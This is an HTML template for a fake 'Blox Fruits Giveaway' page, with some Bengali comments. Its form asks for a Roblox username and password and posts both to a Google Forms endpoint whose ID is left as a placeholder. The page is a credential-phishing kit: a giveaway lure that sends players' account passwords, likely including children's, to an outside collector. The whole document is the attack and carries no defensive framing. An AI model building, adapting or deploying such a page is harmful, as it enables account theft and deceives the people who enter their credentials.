<!DOCTYPE html>
<html>
<head>
<title>Blox Fruits Giveaway</title>
<style>
body{
  font-family:Arial;
  background:url('https://upload.wikimedia.org/wikipedia/en/5/5e/Blox_Fruits_logo.png') no-repeat center center fixed;
  background-size:cover;
  color:white;
  text-align:center;
}
.container{
  background:rgba(30,41,59,0.9); /* হালকা ট্রান্সপারেন্ট ডার্ক ব্যাকগ্রাউন্ড */
  width:350px;
  margin:auto;
  margin-top:100px;
  padding:30px;
  border-radius:10px;
}
input{
  width:90%;
  padding:10px;
  margin:10px;
  border-radius:5px;
  border:none;
}
button{
  background:#22c55e;
  padding:10px;
  width:95%;
  border:none;
  color:white;
  font-size:16px;
  border-radius:5px;
  cursor:pointer;
}
button:hover{
  background:#16a34a;
}
</style>
</head>
<body>
<div class="container">
<h2>Blox Fruits Giveaway</h2>
<form action="https://docs.google.com/forms/d/e/তোমার-ফর্ম-আইডি/formResponse" method="POST">
  <input type="text" name="entry.111111" placeholder="Roblox Username" required>
  <input type="password" name="entry.222222" placeholder="Password (যেকোনো কিছু লিখুন)" required>
  <button type="submit">Join Giveaway</button>
</form>
</div>

</html>
